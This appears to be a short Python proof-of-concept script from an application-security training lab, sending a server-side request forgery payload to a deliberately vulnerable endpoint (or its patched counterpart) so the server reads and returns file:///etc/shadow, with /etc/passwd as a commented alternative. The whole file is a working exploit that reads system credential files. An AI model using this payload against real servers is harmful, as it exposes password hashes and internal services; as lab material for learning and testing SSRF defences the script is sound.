from urllib.error import URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

import cli

use_vulnerable_endpoint, use_webapp_url = cli.get_cli_arguments()

if use_webapp_url:
    url_prefix = "https://appseccheat.codes"
else:
    url_prefix = "http://127.0.0.1:12300"

if use_vulnerable_endpoint:
    url = f"{url_prefix}/vulnerabilities/ssrf2/submit_api_url/"
else:
    url = f"{url_prefix}/patches/ssrf2/submit_api_url/"

# Either of these assignments are valid for this challenge. Note that http://internal_api:12301 is still accessible for this challenge as well.
# custom_url = "file:///etc/passwd"
custom_url = "file:///etc/shadow"

data = {"custom_url": custom_url}

try:
    req = Request(
        url,
        data=urlencode(data).encode("utf-8"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )

    with urlopen(req) as response:
        print(f"Response: {response.read().decode('utf-8')}")
except URLError as e:
    print(f"Error: {e}")
